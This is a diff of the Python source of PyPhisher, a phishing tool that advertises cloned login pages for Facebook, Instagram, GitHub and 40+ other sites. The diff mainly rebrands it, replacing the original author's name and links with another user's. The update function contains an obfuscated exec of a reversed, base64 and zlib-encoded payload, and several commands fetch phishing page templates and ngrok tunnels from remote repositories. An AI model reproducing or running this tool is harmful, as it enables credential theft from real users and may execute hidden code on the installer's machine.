@@ -1,9 +1,9 @@
 # -*- coding: UTF-8 -*-
 # Tool    : PyPhisher
 # Version : 1.6
-# Author  : KasRoudra
-# Github  : https://github.com/KasRoudra
-# Contact : https://m.me/KasRoudra
+# Author  : luis498
+# Github  : https://github.com/luis498
+# Contact : https://m.me/
 # PyPhisher is a phishing tool in python
 # Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
 # Portable file/script
@@ -80,7 +80,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
+Copyright (C) 2021 luis498 (https://github.com/luis498)
 """
 
 import os, sys, time, socket, json
@@ -118,7 +118,7 @@ logo=f'''
 {red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
 {yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
 {green}         __/ |                          {cyan}[v1.6]
-{cyan}        |___/                   {red}[By KasRoudra]
+{cyan}        |___/                   {red}[By luis498]
 '''
 
 pyphisherpyphisherpyphisherpyphisherpyphisher = ""
@@ -241,16 +241,16 @@ def killer():
 def update():
     internet()
     _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
-    git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
+    git_ver=popen("curl -s -N https://raw.githubusercontent.com/luis498/PyPhisher/master/files/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
-        changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
+        changelog=popen("curl -s -N https://raw.githubusercontent.com/luis498/PyPhisher/master/files/changelog.log").read()
         system("clear")
         print(logo)
         print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
         upask=input(ask+"Do you want to update PyPhisher?[y/n] > "+green)
         if upask=="y":
             print(nc)
-            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
+            system("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/luis498/PyPhisher")
             sprint("\n"+success+"PyPhisher updated successfully!! Please restart terminal!\n")
             if (changelog != "404: Not Found"):
                 print(info2+"Changelog:\n"+purple+changelog)
@@ -321,10 +321,10 @@ def about():
     slowprint(logo)
     print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
     print(red+'[Version]   '+cyan+' :[1.6]')
-    print(red+'[Author]    '+cyan+' :[KasRoudra] ')
-    print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
-    print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
-    print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
+    print(red+'[Author]    '+cyan+' :[luis498] ')
+    print(red+'[Github]    '+cyan+' :[https://github.com/luis498] ')
+    print(red+'[Messenger] '+cyan+' :[https://m.me/]')
+    print(red+'[Email]     '+cyan+' :[@gmail.com]')
     print()
     print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
     print()
@@ -381,23 +381,23 @@ def main():
         system("rm -rf ngrok.zip ngrok.tgz")
         if y.find("Linux")!=-1:
             if x.find("aarch64")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
+                system("wget -q --show-progress https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                 system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
             elif x.find("arm")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1 ")
             elif x.find("x86_64")!=-1:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
             else:
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
+                system("wget -q --show-progress https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
         elif y.find("Darwin")!=-1:
             if x.find("x86_64")!=-1:
-                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
+                system("wget -q --show-progress 'https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                 system("unzip ngrok.zip > /dev/null 2>&1")
             elif x.find("arm64")!=-1:
-                system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
+                system("wget -q --show-progress 'https://github.com/luis498/files/raw/master/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
             else:
                 print(f"{error}Device architecture unknown. Download ngrok manually!")
                 sleep(3)
@@ -726,7 +726,7 @@ def main():
         elif choose == "x" or choose == "X":
             about()
         elif choose == "m" or choose == "M":
-            system("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+            system("xdg-open 'https://github.com/luis498/luis498#My-Best-Works'")
             main()
         elif choose=="0":
             pexit()
@@ -755,10 +755,10 @@ def requirements(folder,mask):
             zipver=inform2.read().strip()
             if zipver!=version:
                 sprint("\n"+info+"Downloading required files.....\n")
-                system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
+                system("wget -q --show-progress https://github.com/luis498/files/raw/master/websites.zip -O websites.zip")
     else:
         sprint("\n"+info+"Downloading required files.....\n")
-        system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/websites.zip -O websites.zip")
+        system("wget -q --show-progress https://github.com/luis498/files/raw/master/websites.zip -O websites.zip")
     if os.path.isfile("websites.zip"):
         system("rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
         system("unzip websites.zip -d $HOME/.websites > /dev/null 2>&1")
@@ -772,7 +772,7 @@ def requirements(folder,mask):
             internet()
             sprint("\n"+info+"Downloading required files.....\n")
             system("rm -rf site.zip")
-            system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip -O site.zip")
+            system("wget -q --show-progress https://github.com/luis498/files/raw/master/phishingsites/"+folder+".zip -O site.zip")
             if not os.path.exists(root+"/.websites"):
                 system("cd $HOME && mkdir .websites")
             system("cd $HOME/.websites && mkdir "+folder)
